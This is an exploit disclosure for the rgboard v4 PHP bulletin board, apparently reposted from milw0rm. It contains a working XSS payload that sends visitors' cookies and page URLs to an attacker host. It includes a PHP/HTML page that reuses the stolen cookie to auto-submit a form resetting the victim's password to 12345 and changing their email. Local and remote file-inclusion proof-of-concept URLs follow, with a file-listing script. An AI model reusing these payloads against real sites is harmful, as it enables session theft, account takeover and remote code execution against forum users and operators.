@@ -1,0 +1,135 @@
+rgboard v4 5p1 (07.07.27) Multiple Vulnerability
+bY make0day@gmail.com
+
+/*************************
+
+rgboard (VERSION v4 (07.07.27))is widely used bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+But I find a XSS vuln ,LFI vuln and RFI vuln.
+I attached a exploit that makes password = 12345 (who reads xss post).
+Here is the details:
+
+**************************/
+TEST ON VERSION rgboard v4 (07.07.27)
+Download : http://v4.rgboard.com/
+/***************************
+XSS Vulnerability
+
+/wrtie.php
+
+...
+
+$bd_content = rg_conv_text($bd_content,$bd_html); //You have to check 'html use'.
+
+*************************/
+
+poc:
+
+Inject XSS tag : 
+<img src = "http://attacker.com" onError="window.location='http://attacker.com/c.php?c='+document.cookie+'&l='+window.location">Hi there! :)
+
+/rghunter.php - Makes password as 12345
+
+<?php
+  extract($_GET);
+  
+  $url = eregi_replace("http://","",$l);
+
+  $chk = 0;
+
+  for($i = 0; $i < strlen($url); $i++)
+  {
+	if($url[$i] == '/')
+        {
+		$chk = $i;
+	}
+  }
+  for($i = $chk; $i < strlen($url); $i++)
+  {
+  	$url[$i] = "";
+  }
+
+  $url = $url."/../rg4_member/modify.php";
+  setcookie($c);
+?>
+
+<form action = "http://<?=$url ?>?" method = "post" name = "member_info">
+<input type="hidden" name="form_mode" value="member_modify_ok">
+<input type="hidden" name="ret_url" value="../main/index.php">
+<input type="hidden" name="mb_pass" value="12345">
+<input type="hidden" name="mb_pass1" value="12345">
+<input type="hidden" name="mb_nick" value="hacked">
+<input type="hidden" name="mb_email" value="attacker@attack.com">
+<input type="hidden" name="mb_tel11" value="062">
+<input type="hidden" name="mb_tel12" value="1234">
+<input type="hidden" name="mb_tel13" value="1234">
+<input type="hidden" name="mb_tel21" value="010">
+<input type="hidden" name="mb_tel22" value="123">
+<input type="hidden" name="mb_tel23" value="1234">
+<input type="hidden" name="mb_signature" value="hacked">
+<input type="hidden" name="mb_introduce" value="hacked">
+</form>
+<script>
+document.member_info.submit();
+</script>
+
+/***************************
+Local File Inclusion Vulnerability
+
+/_footer.php
+
+	if(file_exists($skin_path."footer.php")) include($skin_path."footer.php"); //File inclusion
+
+*************************/
+
+poc:
+
+//yeah, there is a problem.. file_exists()!
+//How can we bypass it? I don`t know :)
+//If we have account in same server with target, we can attack his board easily
+//Here is the example :
+
+http://attacker.com/RGboard/rg4_board/_footer.php?skin_path=../../../../../../tmp/
+
+
+/tmp/footer.php
+<?
+$d = dir("/tmp");
+echo "Handle: " . $d->handle . "\n";
+echo "Path: " . $d->path . "\n";
+while (false !== ($entry = $d->read())) {
+   echo $entry."\n";
+}
+$d->close();
+?>
+
+//Yeah, It is good, But when we don`t account in that server, How we can beat target?
+//We can find a clue from php.net
+//On windows, use //computername/share/filename or \\computername\share\filename to check files on network shares.
+//As of PHP 5.0.0, this function can also be used with some URL wrappers. Refer to List of Supported Protocols/Wrappers
+//for a listing of which wrappers support stat() family of functionality.
+//Do you find clue too? :-O
+ 
+
+/***************************
+Remote File Inclusion Vulnerability
+
+/footer.php
+
+		</td>
+	</tr>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+
+...
+
+include($_path['counter']."rg_counter.php"); ?>	//File inclusion
+
+*************************/
+
+poc:
+
+http://test.com/RGboard/include/footer.php?_path[counter]=[RFI]
+
+# milw0rm.com [2009-02-04]
